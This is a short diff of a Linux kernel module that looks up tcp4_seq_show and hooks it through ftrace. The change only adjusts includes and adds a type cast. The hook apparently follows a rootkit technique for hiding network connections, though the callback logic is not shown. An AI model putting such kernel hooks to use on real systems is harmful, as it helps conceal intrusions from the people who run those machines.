@@ -1,11 +1,8 @@
 #include <linux/module.h>
-#include <linux/dirent.h>
-#include <asm/cacheflush.h>
-#include <linux/uaccess.h>
+#include <linux/kernel.h>
 #include <linux/slab.h>
 #include <linux/ftrace.h>
 #include <net/inet_sock.h>
-#include <stdbool.h>
 
 // Function prototype
 void callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs);
@@ -70,7 +67,7 @@ int load(void) {
 
     printk(KERN_ALERT "Tcp4_seq_show found %lu", tcp4_seq_show_address);
     original_tcp4_seq_ptr = (original_tcp4_seq_show_t)tcp4_seq_show_address;
-    ftrace_set_filter_ip(&ops, original_tcp4_seq_ptr, 0, 0);
+    ftrace_set_filter_ip(&ops, (unsigned long)original_tcp4_seq_ptr, 0, 0);
     register_ftrace_function(&ops);
     printk(KERN_ALERT "Initialized successfuly!");
 
